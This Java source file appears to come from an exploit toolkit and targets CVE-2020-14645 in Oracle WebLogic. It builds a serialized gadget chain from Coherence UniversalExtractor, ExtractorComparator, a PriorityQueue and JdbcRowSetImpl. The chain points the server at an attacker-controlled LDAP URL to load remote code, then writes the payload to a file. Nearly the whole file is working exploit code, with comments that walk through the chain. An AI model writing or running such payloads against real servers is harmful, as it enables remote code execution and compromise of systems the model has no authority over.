package com._51pwn.CVE_2020_14645;

import com._51pwn.tools.Tools;
import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.UniversalExtractor;
import ysoserial.payloads.util.Reflections;

import java.util.PriorityQueue;

// CVE-2020-14645
// https://cloud.tencent.com/developer/article/1740557
// https://github.com/huakaii/huakai.github.io/blob/14f4ce2b2d3e5390dfa8ecf318b5e7525d991f24/docs/papers/java/weblogic/CVE-2020-14645.md
//    weblogic 10.3.6.0
//    weblogic 12.1.3.0
//    weblogic 12.2.1.4
//    weblogic 14.1.1.0.0
public class Main {
    public static void main(String[] args) throws Exception {
        String ldap = args[1];//"ldap://docker.for.mac.localhost:1389/UpX34defineClass";
        // 未后续 操作 方法 getDatabaseMetaData 进行定义
        UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()");
        // 两个，用来做比较触发链条
        PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(extractor));
        Reflections.setFieldValue(queue,"size",2);

//         getDatabaseMetaData -> connect -> getDataSourceName -> InitialContext.lookup -> getConnection(user,pswd)
        JdbcRowSetImpl jdbcRowSet = Tools.GetJdbcRowSetImpl(ldap);
        queue.add(jdbcRowSet);
        queue.add(jdbcRowSet);
        Tools.WtOo1(queue);
        System.out.println("write ok");
    }
}
